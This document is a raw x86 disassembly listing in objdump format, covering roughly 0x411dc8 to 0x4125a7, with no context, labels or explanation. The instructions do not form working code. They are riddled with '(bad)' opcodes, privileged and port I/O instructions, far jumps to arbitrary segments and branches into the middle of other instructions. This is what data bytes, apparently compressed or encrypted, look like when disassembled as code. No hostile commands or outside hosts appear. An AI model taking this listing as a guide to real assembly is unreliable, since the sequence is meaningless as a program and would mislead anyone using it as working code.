  411dc8:	(bad)  
  411dc9:	repz mov al,BYTE PTR [ecx]
  411dcc:	pop    eax
  411dcd:	cld    
  411dce:	shr    DWORD PTR [eax],1
  411dd0:	and    ch,dh
  411dd2:	fisub  WORD PTR [ebp+ebp*4+0x34]
  411dd6:	or     BYTE PTR [esi+0x60],al
  411dd9:	fbstp  TBYTE PTR [esp+edx*4-0x76ee557d]
  411de0:	sbb    edx,DWORD PTR [edi]
  411de2:	addr16 inc ebp
  411de4:	and    ah,ah
  411de6:	fsubp  st(6),st
  411de8:	xor    al,0x2e
  411dea:	sub    al,0x9
  411dec:	xchg   DWORD PTR [edx+0xb31b1a2],edi
  411df2:	int    0x95
  411df4:	fabs   
  411df6:	sub    al,0xa
  411df8:	int    0x58
  411dfa:	pop    esp
  411dfb:	jb     0x411da5
  411dfd:	fadd   QWORD PTR [edi]
  411dff:	or     esp,DWORD PTR [edx]
  411e01:	jbe    0x411d9d
  411e03:	(bad)  
  411e04:	addr16 aaa 
  411e06:	in     al,dx
  411e07:	pop    ds
  411e08:	mov    ?,WORD PTR [edi+esi*1-0x23]
  411e0c:	add    al,0x34
  411e0e:	sub    bh,cl
  411e10:	xchg   DWORD PTR [edi-0x8],esi
  411e13:	out    dx,al
  411e14:	lea    ebx,es:[ebx+0x38]
  411e18:	mov    fs,WORD PTR [esi]
  411e1a:	out    dx,al
  411e1b:	xchg   ebp,eax
  411e1c:	into   
  411e1d:	fxch   st(3)
  411e1f:	fldcw  WORD PTR [edi+eax*2+0x72430798]
  411e26:	jae    0x411e2e
  411e28:	mov    edi,0xaaa3727b
  411e2d:	xchg   ecx,eax
  411e2e:	adc    ch,bl
  411e30:	mov    cl,BYTE PTR [esp+edx*4]
  411e33:	test   BYTE PTR [esp+edx*2-0x28006c04],ah
  411e3a:	jl     0x411df8
  411e3c:	mov    ds:0x647672b9,al
  411e41:	fidivr DWORD PTR [edx]
  411e43:	sbb    dh,al
  411e45:	loop   0x411e53
  411e47:	and    DWORD PTR [ebx+0x77e24b48],eax
  411e4d:	inc    esi
  411e4e:	rcr    bl,1
  411e50:	jmp    0x1e82:0xc319bd0f
  411e57:	fcom   DWORD PTR [esi+eax*1]
  411e5a:	bnd jp 0x411e20
  411e5d:	push   edx
  411e5e:	fistp  DWORD PTR [ebx]
  411e60:	xchg   ebx,eax
  411e61:	les    edi,FWORD PTR [esp+edi*8+0x55]
  411e65:	cli    
  411e66:	xor    ecx,DWORD PTR [ecx-0x50]
  411e69:	mov    al,ds:0x7920f807
  411e6e:	dec    ebx
  411e6f:	bnd jge 0x411e43
  411e72:	or     DWORD PTR [ebx-0x43],0x716f6798
  411e79:	jge    0x411e0e
  411e7b:	popf   
  411e7c:	cmp    BYTE PTR [ecx],dh
  411e7e:	test   DWORD PTR [edi+0x17fe86e6],0x421a81e4
  411e88:	es push esi
  411e8a:	jae    0x411e65
  411e8c:	push   esi
  411e8d:	test   BYTE PTR [edi-0x5],dh
  411e90:	cmc    
  411e91:	test   DWORD PTR [edx+0x2b1b63fe],esp
  411e97:	sub    dh,BYTE PTR [edi]
  411e99:	ins    BYTE PTR es:[edi],dx
  411e9a:	imul   ecx,ecx,0xa488fcb3
  411ea0:	mov    eax,ds:0x21d81c94
  411ea5:	adc    al,0x4b
  411ea7:	fwait
  411ea8:	sub    DWORD PTR [ebp-0x46],ebp
  411eab:	sub    dh,ah
  411ead:	fbstp  TBYTE PTR ds:0xcae7d7ae
  411eb3:	test   eax,0x351d2007
  411eb8:	dec    edi
  411eb9:	push   ebp
  411eba:	aas    
  411ebb:	(bad)  
  411ebc:	daa    
  411ebd:	imul   ebx,DWORD PTR [esi+0x13bc0d0e],0x2a450473
  411ec7:	xor    al,0x71
  411ec9:	aam    0x86
  411ecb:	iret   
  411ecc:	fs inc ecx
  411ece:	je     0x411f4f
  411ed0:	push   edx
  411ed1:	in     eax,dx
  411ed2:	jp     0x411e69
  411ed4:	push   ebp
  411ed5:	or     eax,0x562444f7
  411eda:	inc    esi
  411edb:	imul   esp,esp,0xc54674df
  411ee1:	mov    eax,0x7307699c
  411ee6:	cmp    ebp,DWORD PTR [ebx]
  411ee8:	mov    al,ds:0x2ce660a6
  411eed:	ins    DWORD PTR es:[edi],dx
  411eee:	jns    0x411ed0
  411ef0:	mov    esp,0x2782ddd1
  411ef5:	aam    0x82
  411ef7:	adc    eax,0xd3ae555a
  411efc:	xor    al,BYTE PTR [edx+edx*8+0x6c0bb645]
  411f03:	dec    edx
  411f04:	out    dx,eax
  411f05:	mov    edi,0x43fe2406
  411f0a:	jne    0x411f1b
  411f0c:	pop    eax
  411f0d:	les    eax,FWORD PTR [ebx]
  411f0f:	(bad)  
  411f10:	scas   eax,DWORD PTR es:[edi]
  411f11:	xor    DWORD PTR [ecx+edx*4+0x669c917f],eax
  411f18:	xor    eax,0x8d44df7a
  411f1d:	or     dh,bh
  411f1f:	sti    
  411f20:	mov    cl,0x83
  411f22:	push   es
  411f23:	sub    eax,0xba1d63c5
  411f28:	jecxz  0x411f17
  411f2a:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f2c:	sbb    BYTE PTR [edi+0x3a],bl
  411f2f:	daa    
  411f30:	push   ebp
  411f31:	outs   dx,BYTE PTR ds:[esi]
  411f32:	lahf   
  411f33:	lds    eax,FWORD PTR [ecx+0x28]
  411f36:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  411f38:	xor    eax,DWORD PTR [ecx]
  411f3a:	jmp    0x411f3b
  411f3c:	cdq    
  411f3d:	hlt    
  411f3e:	cwde   
  411f3f:	jae    0x411fa6
  411f41:	sub    ah,BYTE PTR [ecx]
  411f43:	rcl    cl,0x3f
  411f46:	arpl   WORD PTR [edi],bp
  411f48:	test   bl,ah
  411f4a:	mov    al,0x89
  411f4c:	test   eax,0x5d98beba
  411f51:	das    
  411f52:	mov    eax,ds:0x4227767a
  411f57:	bound  edi,QWORD PTR [ebp+0x29]
  411f5a:	mov    ds:0xc6c517d0,eax
  411f5f:	stos   BYTE PTR es:[edi],al
  411f60:	jmp    0x7acd:0xe350deda
  411f67:	xor    al,0x60
  411f69:	cmp    eax,0x114eceae
  411f6e:	fcomp  QWORD PTR [eax]
  411f70:	add    DWORD PTR [ecx+0x3d6e53e1],edx
  411f76:	int3   
  411f77:	adc    al,0xd5
  411f79:	test   eax,0x46b5442b
  411f7e:	cmp    eax,0xeedb7109
  411f83:	mov    dh,0x9b
  411f85:	push   esp
  411f86:	bound  eax,QWORD PTR [ebp+0x6f]
  411f89:	mov    ds:0xf3ce3660,al
  411f8e:	out    0x8,eax
  411f90:	cmp    edi,DWORD PTR [eax+0x42]
  411f93:	cbw    
  411f95:	mov    al,0x13
  411f97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f98:	inc    esi
  411f99:	in     eax,0x7c
  411f9b:	mov    ebx,0xa11b3ab5
  411fa0:	dec    esi
  411fa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fa2:	inc    esp
  411fa3:	call   0x8011:0x91390198
  411faa:	mov    ebp,0xd8a50b8b
  411faf:	test   BYTE PTR [ebp+0x299ac733],al
  411fb5:	mov    bl,BYTE PTR [esi+0x6e]
  411fb8:	sbb    ebx,DWORD PTR [esi+eax*1+0x61]
  411fbc:	push   0xffffff9d
  411fbe:	mov    ds:0x535de45e,al
  411fc3:	das    
  411fc4:	pop    sp
  411fc6:	jl     0x412018
  411fc8:	or     esi,DWORD PTR [edi+edx*4+0x2c]
  411fcc:	out    0x37,al
  411fce:	add    eax,0xec5a8099
  411fd3:	fwait
  411fd4:	or     dl,BYTE PTR [eax+eiz*2-0x31]
  411fd8:	xlat   BYTE PTR ds:[ebx]
  411fd9:	mov    ecx,0x64ab7b17
  411fde:	jg     0x411f8e
  411fe0:	add    al,0xd6
  411fe2:	cld    
  411fe3:	push   esp
  411fe4:	cmp    al,0x57
  411fe6:	dec    esp
  411fe7:	pop    DWORD PTR [ecx-0x62]
  411fea:	xchg   ebx,eax
  411feb:	out    dx,al
  411fec:	pop    eax
  411fed:	sub    eax,0xfa801c4a
  411ff2:	push   cs
  411ff3:	sahf   
  411ff4:	repnz inc ebx
  411ff6:	xchg   ebp,eax
  411ff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ff8:	sub    eax,0x1ac98be8
  411ffd:	push   esp
  411ffe:	ret    0x105f
  412001:	pop    edx
  412002:	fucom  st(5)
  412004:	sbb    eax,0x2bc75e91
  412009:	push   edi
  41200a:	adc    eax,0xf21255d3
  41200f:	mov    ds:0x17a78fe3,al
  412014:	int3   
  412015:	or     al,0xa5
  412017:	sub    DWORD PTR [ebx-0x3f],edi
  41201a:	(bad)  
  41201b:	test   eax,0xc588c9e0
  412020:	push   edx
  412021:	cli    
  412022:	mov    esi,0x131de508
  412027:	lahf   
  412028:	jbe    0x412022
  41202a:	ret    
  41202b:	and    eax,0x1ed69164
  412030:	sub    BYTE PTR [esi-0x465e82ac],al
  412036:	push   es
  412037:	mov    ecx,ecx
  412039:	clc    
  41203a:	sbb    BYTE PTR [edi+eax*1],ah
  41203d:	sub    eax,0x9ec7b9b1
  412042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412043:	shr    BYTE PTR [edi],cl
  412045:	xor    eax,0xe0bdba93
  41204a:	inc    ah
  41204c:	xchg   ebx,eax
  41204d:	cs fsubr st(7),st
  412050:	dec    ebx
  412051:	xchg   ebx,eax
  412052:	sub    eax,0x705defbf
  412057:	mov    eax,DWORD PTR [eax+0x69]
  41205a:	lahf   
  41205b:	test   al,0x99
  41205d:	and    ah,BYTE PTR [ecx]
  41205f:	lock sub bl,BYTE PTR [ecx]
  412062:	push   ds
  412063:	fs rcr BYTE PTR fs:[edx-0x56],1
  412068:	test   DWORD PTR [eax],esp
  41206a:	mov    dh,bh
  41206c:	and    esp,DWORD PTR [ebx-0x42]
  41206f:	adc    al,0xfe
  412071:	jo     0x412071
  412073:	ds xchg ecx,eax
  412075:	and    BYTE PTR [edi+0x1d],bl
  412078:	push   ds
  412079:	inc    ebx
  41207a:	gs pop esi
  41207c:	outs   dx,BYTE PTR ds:[esi]
  41207d:	push   0x1e
  41207f:	push   ebp
  412080:	aam    0x1c
  412082:	fistp  DWORD PTR [edx+0x29]
  412085:	push   edi
  412086:	int3   
  412087:	sub    DWORD PTR [ebp-0x5ef11c2c],edi
  41208d:	push   esi
  41208e:	fs retf 0x1839
  412092:	add    DWORD PTR [edi+0x6038bab3],0x97eb36f0
  41209c:	jecxz  0x41206d
  41209e:	sbb    DWORD PTR [eax+0x9d1516],ebx
  4120a4:	dec    eax
  4120a5:	jge    0x41202e
  4120a7:	jl     0x4120c0
  4120a9:	in     eax,dx
  4120aa:	pushf  
  4120ab:	stos   DWORD PTR es:[edi],eax
  4120ac:	out    0xf2,eax
  4120ae:	pop    es
  4120af:	repnz dec ebx
  4120b1:	fdivr  QWORD PTR [edx-0x7cd32238]
  4120b7:	inc    DWORD PTR [ebp-0x24]
  4120ba:	outs   dx,BYTE PTR ds:[esi]
  4120bb:	or     DWORD PTR [edx-0x5a],ebp
  4120be:	mov    ebp,0xfedeaac9
  4120c3:	sbb    BYTE PTR [eax+0x5a670ad4],0x69
  4120ca:	loope  0x41208c
  4120cc:	or     edx,edi
  4120ce:	adc    al,0x4b
  4120d0:	nop
  4120d1:	es mov ebx,0x506846e5
  4120d7:	xchg   edx,eax
  4120d8:	outs   dx,DWORD PTR ds:[esi]
  4120d9:	xor    ch,BYTE PTR [esi-0x71]
  4120dc:	arpl   WORD PTR [edx-0x38a54ebd],bp
  4120e2:	add    al,0xb8
  4120e4:	adc    eax,0xc04b3e11
  4120e9:	repnz in al,dx
  4120eb:	xlat   BYTE PTR ds:[ebx]
  4120ec:	iret   
  4120ed:	js     0x412098
  4120ef:	rcr    BYTE PTR [esi-0x37],0x74
  4120f3:	in     al,0x58
  4120f5:	fcomp  QWORD PTR [esi]
  4120f7:	cmp    ebp,ecx
  4120f9:	lea    esp,[esi]
  4120fb:	xchg   edx,eax
  4120fc:	add    ecx,esp
  4120fe:	lock test al,0xa5
  412101:	add    eax,0x4add4110
  412106:	sbb    BYTE PTR [ecx],al
  412108:	fdiv   QWORD PTR ds:0xfee0fe31
  41210e:	sar    BYTE PTR [esp+edx*8],0x3f
  412112:	pushf  
  412113:	das    
  412114:	or     bl,BYTE PTR [eax-0x7c]
  412117:	add    dl,ah
  412119:	ja     0x412172
  41211b:	mov    dh,0x55
  41211d:	adc    al,0x1d
  41211f:	cmp    bl,BYTE PTR [esi]
  412121:	(bad)  
  412122:	call   0xc6372e6f
  412127:	gs (bad) 
  41212a:	aad    0x88
  41212c:	sbb    al,0x72
  41212e:	leave  
  41212f:	scas   eax,DWORD PTR es:[edi]
  412130:	xor    eax,0x86e1f447
  412135:	ror    DWORD PTR [ecx+edi*2-0x5a],0x29
  41213a:	femms  
  41213c:	(bad)  [esi-0xb]
  41213f:	and    eax,DWORD PTR [ecx-0x29]
  412142:	imul   edx,ebx,0xffffffbf
  412145:	mov    DWORD PTR [edx],eax
  412147:	in     al,0x73
  412149:	stos   DWORD PTR es:[edi],eax
  41214a:	aad    0x90
  41214c:	sub    al,0xb
  41214e:	xchg   edx,eax
  41214f:	jecxz  0x41213a
  412151:	or     BYTE PTR ds:0x2826fe55,ch
  412157:	and    eax,0x1de4b5a6
  41215c:	push   0xe16b04fa
  412161:	cmp    DWORD PTR [ebx+edi*8-0x2c1d356e],edi
  412168:	xor    eax,0xa4ab26fc
  41216d:	xchg   edi,eax
  41216e:	mov    edx,0x2358d11
  412173:	push   edx
  412174:	jnp    0x412172
  412176:	xchg   ecx,eax
  412177:	xchg   esp,eax
  412178:	aam    0x6
  41217a:	stos   DWORD PTR es:[edi],eax
  41217b:	jecxz  0x412188
  41217d:	inc    esp
  41217e:	or     DWORD PTR es:[esi+0x4c],ebx
  412182:	mov    dl,0x7c
  412184:	adc    esp,DWORD PTR [ebp-0xb]
  412187:	dec    edx
  412188:	gs push edx
  41218a:	mov    ecx,0x462d6b25
  41218f:	in     eax,dx
  412190:	xchg   esi,eax
  412191:	ins    BYTE PTR es:[edi],dx
  412192:	push   0x55490335
  412197:	outs   dx,DWORD PTR ds:[esi]
  412198:	mov    DWORD PTR [edx+edi*8-0x6c3abf86],0x86fec448
  4121a3:	or     ebp,DWORD PTR [edx+edi*4]
  4121a6:	iret   
  4121a7:	jmp    0x596f3afd
  4121ac:	bound  esp,QWORD PTR [ebx]
  4121ae:	inc    BYTE PTR [eax-0x7af1bfbf]
  4121b4:	stos   BYTE PTR es:[edi],al
  4121b5:	je     0x4121bc
  4121b7:	lds    ebx,FWORD PTR [ecx-0x63cf9fa8]
  4121bd:	clc    
  4121be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121bf:	pop    esi
  4121c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121c1:	xchg   esp,eax
  4121c2:	push   eax
  4121c3:	add    esp,esp
  4121c5:	mov    BYTE PTR [edi+0x30],dh
  4121c8:	xor    dh,cl
  4121ca:	mov    ah,0x85
  4121cc:	shr    edx,0x16
  4121cf:	add    ebp,DWORD PTR [ecx-0x34]
  4121d2:	push   0x2cff7b92
  4121d7:	inc    eax
  4121d8:	add    ecx,DWORD PTR [ebx-0x1bb39430]
  4121de:	into   
  4121df:	test   al,0xb1
  4121e1:	in     eax,0x98
  4121e3:	push   0x9c13617d
  4121e8:	(bad)  
  4121e9:	aaa    
  4121ea:	jmp    0x412222
  4121ec:	mov    edx,0x747d0262
  4121f1:	adc    dl,dl
  4121f3:	xor    al,0x67
  4121f5:	neg    DWORD PTR [ebx-0x19608d41]
  4121fb:	ins    DWORD PTR es:[edi],dx
  4121fc:	pusha  
  4121fd:	push   esi
  4121fe:	mov    al,ds:0xdfc89f6f
  412203:	not    BYTE PTR [eax+0x5d73c03e]
  412209:	clc    
  41220a:	in     eax,0x6f
  41220c:	outs   dx,DWORD PTR ds:[esi]
  41220d:	pop    eax
  41220e:	sbb    esi,DWORD PTR [edx+0x31]
  412211:	pcmpgtd mm4,QWORD PTR [esi-0x7b1a55e5]
  412218:	sub    al,0x12
  41221a:	ins    BYTE PTR es:[edi],dx
  41221b:	sahf   
  41221c:	jmp    0x833bd833
  412221:	inc    ebp
  412222:	xor    ch,0xbb
  412225:	sub    eax,0x193c98e5
  41222a:	or     BYTE PTR [edx],0xd0
  41222d:	ror    edx,1
  41222f:	xchg   ebx,eax
  412230:	mov    eax,ds:0x138d7a99
  412235:	retf   
  412236:	outs   dx,DWORD PTR ds:[esi]
  412237:	fst    DWORD PTR [ebp+0x9]
  41223a:	inc    edi
  41223b:	mov    ecx,0x8b3a5c2c
  412240:	sub    BYTE PTR [ebx+0x4d],ch
  412243:	mov    al,0x2f
  412245:	shl    DWORD PTR [esi],cl
  412247:	cli    
  412248:	sbb    al,0xeb
  41224a:	ss dec ebp
  41224c:	push   cs
  41224d:	daa    
  41224e:	je     0x412283
  412250:	mov    cs,WORD PTR [esi-0x6d]
  412253:	enter  0x1e64,0x32
  412257:	ins    DWORD PTR es:[edi],dx
  412258:	(bad)  
  412259:	jno    0x41221a
  41225b:	push   ds
  41225c:	pop    eax
  41225d:	sub    DWORD PTR [edx+0x39],edx
  412260:	mov    bl,0xdc
  412263:	jae    0x4121ef
  412265:	out    dx,eax
  412266:	shr    BYTE PTR [eax+ebx*2-0x377f9a0],cl
  41226d:	adc    eax,0xba787f7d
  412272:	dec    ecx
  412273:	jp     0x412289
  412275:	cwde   
  412276:	sub    edi,eax
  412278:	aaa    
  412279:	and    eax,0xa0ebb7c0
  41227e:	or     esp,DWORD PTR [eax-0x3e71081a]
  412284:	mov    al,ds:0x942f8f82
  412289:	in     al,dx
  41228a:	rcr    BYTE PTR [eax+0x52],0xda
  41228e:	ror    ah,cl
  412290:	xor    BYTE PTR [eax+0x32fe2ae2],0x66
  412297:	loop   0x412290
  412299:	outs   dx,DWORD PTR ds:[esi]
  41229a:	repnz es stos BYTE PTR es:[edi],al
  41229d:	jne    0x41221f
  41229f:	push   ebx
  4122a0:	dec    esi
  4122a1:	xchg   esi,eax
  4122a2:	in     eax,dx
  4122a3:	pop    esp
  4122a4:	jo     0x41229a
  4122a6:	hlt    
  4122a7:	cli    
  4122a8:	daa    
  4122a9:	js     0x41227e
  4122ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122ac:	fild   QWORD PTR [ebx]
  4122ae:	mov    al,0xaa
  4122b0:	mov    eax,DWORD PTR [eax-0x73]
  4122b3:	mov    dl,0xa7
  4122b5:	(bad)  
  4122b6:	cmc    
  4122b7:	sbb    ebx,edi
  4122b9:	pusha  
  4122ba:	into   
  4122bb:	sti    
  4122bc:	xchg   DWORD PTR [ebx+eiz*8-0x6eb9a63d],eax
  4122c3:	icebp  
  4122c4:	gs cld 
  4122c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122c7:	add    DWORD PTR [ebx+0x704ce994],ecx
  4122cd:	push   ss
  4122ce:	loop   0x412293
  4122d0:	adc    al,0x2c
  4122d2:	aaa    
  4122d3:	hlt    
  4122d4:	mov    gs,WORD PTR [ebx-0x208085c3]
  4122da:	fistp  QWORD PTR [ebx+0x35bfb96]
  4122e0:	sub    DWORD PTR [ebp-0x544fc457],ebp
  4122e6:	inc    edx
  4122e7:	xchg   ebp,eax
  4122e8:	or     esi,DWORD PTR [edi]
  4122ea:	push   ecx
  4122eb:	les    ebp,FWORD PTR [esi]
  4122ed:	jl     0x4122d7
  4122ef:	cmp    bh,BYTE PTR [ecx-0x1363c1e9]
  4122f5:	inc    esi
  4122f6:	xor    bl,ah
  4122f8:	and    dh,bh
  4122fa:	(bad)  
  4122fb:	xor    ebx,DWORD PTR [ebx+0x58f8094]
  412301:	and    al,0x49
  412303:	rcr    DWORD PTR [eax],1
  412305:	xlat   BYTE PTR ds:[ebx]
  412306:	ret    0x575c
  412309:	and    eax,DWORD PTR [eax-0x4b60e805]
  41230f:	mov    cl,BYTE PTR [edx-0x4a]
  412312:	hlt    
  412313:	add    DWORD PTR [edx+0x4d],ecx
  412316:	add    ebx,DWORD PTR ds:0xaacd5f03
  41231c:	sub    al,0xd3
  41231e:	je     0x4122b6
  412320:	les    ebp,FWORD PTR [esi]
  412322:	mov    gs,WORD PTR [edi]
  412324:	daa    
  412325:	dec    ebp
  412326:	lods   al,BYTE PTR ds:[esi]
  412327:	scas   al,BYTE PTR es:[edi]
  412328:	sahf   
  412329:	pusha  
  41232a:	sbb    al,0xd5
  41232c:	and    eax,0x4c138dcd
  412331:	repnz cmp BYTE PTR [edi+0x3c],0x27
  412336:	stc    
  412337:	mov    cl,0x38
  412339:	or     cl,BYTE PTR [edi]
  41233b:	mov    dh,0xfc
  41233d:	in     eax,0x89
  41233f:	xchg   ebp,eax
  412340:	mov    al,ds:0xd078b7dd
  412345:	pop    ss
  412346:	or     edi,DWORD PTR [esi-0x66]
  412349:	fmul   QWORD PTR [esi-0x418faa3d]
  41234f:	ret    0x16bf
  412352:	enter  0xb4a4,0x66
  412356:	sbb    eax,0x1674b8fd
  41235b:	scas   al,BYTE PTR es:[edi]
  41235c:	cmp    eax,0xbd67911a
  412361:	mov    ebx,0x56ec6b4f
  412366:	xchg   ebp,eax
  412367:	push   cs
  412368:	pushf  
  412369:	xchg   edx,eax
  41236a:	and    al,0xfd
  41236c:	das    
  41236d:	gs jns 0x41236b
  412370:	enter  0x822f,0xed
  412374:	mov    cl,0x64
  412376:	lahf   
  412377:	dec    esi
  412378:	hlt    
  412379:	cmp    dl,BYTE PTR [ebp+0x63]
  41237c:	push   cs
  41237d:	or     esi,DWORD PTR [esi]
  41237f:	aas    
  412380:	mov    ds:0xa1967c9e,al
  412385:	mov    al,0x9f
  412387:	cmp    esi,DWORD PTR [ebp+0x12]
  41238a:	pop    ebx
  41238b:	inc    esp
  41238c:	mov    eax,0x8837a0c0
  412391:	mov    ds:0x9c17375e,al
  412396:	jne    0x4123ab
  412398:	push   ss
  412399:	add    eax,0x7a1f781e
  41239e:	mov    cl,0x6b
  4123a0:	retf   
  4123a1:	cmp    bl,ah
  4123a3:	lods   al,BYTE PTR ds:[esi]
  4123a4:	dec    ebp
  4123a5:	pop    eax
  4123a6:	xor    DWORD PTR [edx],esp
  4123a8:	jae    0x4123fc
  4123aa:	sub    BYTE PTR [ecx],bh
  4123ac:	cmc    
  4123ad:	imul   ebp,DWORD PTR [ebp-0x4b397dc4],0x7bc79c28
  4123b7:	push   0xd96857e8
  4123bc:	and    cl,BYTE PTR [edi+0x53]
  4123bf:	and    DWORD PTR [ebp+eax*1+0x2d9955fd],edi
  4123c6:	mov    bh,0x6f
  4123c8:	xlat   BYTE PTR ds:[ebx]
  4123c9:	sub    DWORD PTR [ebp-0x3d0391bf],eax
  4123cf:	sbb    eax,0xcfcba4b4
  4123d4:	ror    BYTE PTR [edi+0xe413ef3],0x37
  4123db:	sbb    al,0x88
  4123dd:	into   
  4123de:	data16 add BYTE PTR [ebx-0x3c803f02],0x20
  4123e6:	jp     0x4123eb
  4123e8:	mov    BYTE PTR [eax-0x1a454355],bl
  4123ee:	inc    ecx
  4123ef:	mov    ebp,0x7f5d35fa
  4123f4:	pop    ds
  4123f5:	push   esp
  4123f6:	push   ds
  4123f7:	call   0xc46f:0x2d6aa5fc
  4123fe:	ss mov ah,0x3f
  412401:	mov    ah,0x90
  412403:	push   edx
  412404:	mov    ch,0x87
  412406:	jne    0x4123ca
  412408:	add    al,0x27
  41240a:	aam    0x88
  41240c:	in     eax,0xd6
  41240e:	xor    eax,0xc8163c5d
  412413:	stos   BYTE PTR es:[edi],al
  412414:	ror    BYTE PTR [ebp+esi*4+0x6e],cl
  412418:	fwait
  412419:	mov    al,0x4b
  41241b:	jns    0x412472
  41241d:	loopne 0x412428
  41241f:	mov    al,ds:0xd5192d05
  412424:	sbb    eax,0xc1b7aaf5
  412429:	inc    ebp
  41242a:	popa   
  41242b:	push   ss
  41242c:	inc    ebp
  41242d:	pushf  
  41242e:	jg     0x4123c2
  412430:	popf   
  412431:	inc    BYTE PTR [edx-0x56]
  412434:	mov    ds:0xc376e05c,al
  412439:	(bad)  
  41243a:	cmp    BYTE PTR [eax-0x516f781d],dh
  412440:	mov    ebp,0x35455184
  412445:	outs   dx,DWORD PTR ds:[esi]
  412446:	(bad)  
  412447:	in     eax,0xe2
  412449:	mov    ebp,edi
  41244b:	ffree  st(7)
  41244d:	clc    
  41244e:	mov    ebx,0xfd0397bd
  412453:	jg     0x412449
  412455:	loope  0x41245f
  412457:	fsin   
  412459:	int    0xf2
  41245b:	xlat   BYTE PTR ds:[ebx]
  41245c:	subps  xmm7,XMMWORD PTR [ebx+0x42]
  412460:	lock inc edi
  412462:	out    dx,eax
  412463:	add    BYTE PTR [ecx-0x12],dl
  412466:	inc    esi
  412467:	and    BYTE PTR [ecx],bh
  412469:	imul   ecx,DWORD PTR [edx],0xffffffe7
  41246c:	cmp    eax,0x34310287
  412471:	and    ch,ch
  412473:	xchg   BYTE PTR [edi-0x50],dh
  412476:	xchg   esi,eax
  412477:	test   DWORD PTR [edi-0x3b],ebp
  41247a:	dec    edx
  41247b:	call   0x140:0xc527b3de
  412482:	and    DWORD PTR [ebp+0x1c582297],ecx
  412488:	stos   DWORD PTR es:[edi],eax
  412489:	mov    esi,0xdad9be4e
  41248e:	mov    cl,0x93
  412490:	int3   
  412491:	xor    ebp,DWORD PTR [ecx]
  412493:	test   esi,0x31b3d3aa
  412499:	mov    dl,bl
  41249b:	xchg   esi,eax
  41249c:	(bad)  
  41249d:	push   ss
  41249e:	hlt    
  41249f:	adc    eax,0xdf8268f5
  4124a4:	mov    edi,0x842e23a3
  4124a9:	stos   BYTE PTR es:[edi],al
  4124aa:	pop    ecx
  4124ab:	pop    eax
  4124ac:	dec    esp
  4124ad:	(bad)
  4124b1:	ror    BYTE PTR [ebx-0x50],1
  4124b4:	cmp    DWORD PTR [ebx-0x2fc81b4],0x57
  4124bb:	sbb    cl,BYTE PTR [edi+0x1c760ce2]
  4124c1:	and    eax,0xb1957fee
  4124c6:	sbb    ch,BYTE PTR [esi-0x6]
  4124c9:	mov    esi,DWORD PTR [edx+eiz*4+0x6875894c]
  4124d0:	mov    cs,esp
  4124d2:	das    
  4124d3:	je     0x41250c
  4124d5:	xor    DWORD PTR [esi+0x3a],esi
  4124d8:	jb     0x4124f3
  4124da:	sub    ebx,eax
  4124dc:	fsubp  st(4),st
  4124de:	mov    cs,WORD PTR [ebp+0x527d4ffa]
  4124e4:	popf   
  4124e5:	or     eax,ecx
  4124e7:	sti    
  4124e8:	mov    dl,0xb1
  4124ea:	rdmsr  
  4124ec:	push   esp
  4124ed:	(bad)  
  4124ee:	sbb    BYTE PTR [ecx],al
  4124f0:	pop    ecx
  4124f1:	addr16 stc 
  4124f3:	adc    DWORD PTR [ecx],esp
  4124f5:	add    bl,al
  4124f7:	jmp    0x4124b9
  4124f9:	sub    eax,DWORD PTR [ebx+0x76]
  4124fc:	mov    gs,esi
  4124fe:	sub    eax,0x3c16c933
  412503:	sub    DWORD PTR [edi-0x75b155ca],ebx
  412509:	ficom  WORD PTR ds:0x928dbd77
  41250f:	or     al,0xd4
  412511:	inc    eax
  412512:	xchg   ebp,eax
  412513:	xchg   esp,eax
  412514:	sbb    edx,ecx
  412516:	cli    
  412517:	mov    ah,0xe2
  412519:	jae    0x412516
  41251b:	test   edx,ebx
  41251d:	pop    ds
  41251e:	out    dx,eax
  41251f:	jmp    FWORD PTR ds:[eax+0x6c62d0eb]
  412526:	(bad)  
  412527:	popf   
  412528:	push   cs
  412529:	jmp    0xe3bea89d
  41252e:	and    DWORD PTR [ecx+0x288faf49],ebp
  412534:	add    eax,0x6b784711
  412539:	mov    dl,0xee
  41253b:	retf   
  41253c:	sub    DWORD PTR [esi+0x5ccf90fe],ebx
  412542:	jge    0x4125ae
  412544:	xchg   ebp,eax
  412545:	mov    ebp,ebx
  412547:	fmul   QWORD PTR [eax+0x4e]
  41254a:	mov    ds:0x3b32bc82,al
  41254f:	adc    bh,dh
  412551:	push   ebp
  412552:	dec    esp
  412553:	mov    bh,0x1f
  412555:	loope  0x4125c8
  412557:	inc    ecx
  412558:	mov    ch,0x67
  41255a:	xor    al,0x42
  41255c:	daa    
  41255d:	scas   al,BYTE PTR es:[edi]
  41255e:	cmp    bh,bl
  412560:	hlt    
  412561:	sbb    DWORD PTR [ebx-0xc587cd6],eax
  412567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412568:	cli    
  412569:	push   edi
  41256a:	pop    ebp
  41256b:	lahf   
  41256c:	pushf  
  41256d:	adc    BYTE PTR [bx+di],ah
  412570:	jge    0x4125a8
  412572:	lods   al,BYTE PTR ds:[esi]
  412573:	or     BYTE PTR [ebp-0xf],dl
  412576:	fistp  QWORD PTR [edi-0x77f2abcb]
  41257c:	xchg   edi,eax
  41257d:	data16 mov ah,0x5e
  412580:	fdiv   DWORD PTR [edx-0x19]
  412583:	test   al,0xe4
  412585:	sahf   
  412586:	adc    BYTE PTR [edi+ebx*2-0x46],bl
  41258a:	xchg   ebx,eax
  41258b:	(bad)  
  41258c:	xchg   edx,eax
  41258d:	aas    
  41258e:	jb     0x412510
  412590:	and    edi,esi
  412592:	pop    esi
  412593:	push   ebx
  412594:	xor    BYTE PTR [ecx],0x3d
  412597:	mov    eax,0xba7a7efe
  41259c:	inc    eax
  41259d:	fisub  DWORD PTR [ebp-0x5b]
  4125a0:	retf   
  4125a1:	retf   
  4125a2:	sub    bl,ch
  4125a4:	bound  edx,QWORD PTR [ebp+0x43]
  4125a7:	(bad)  
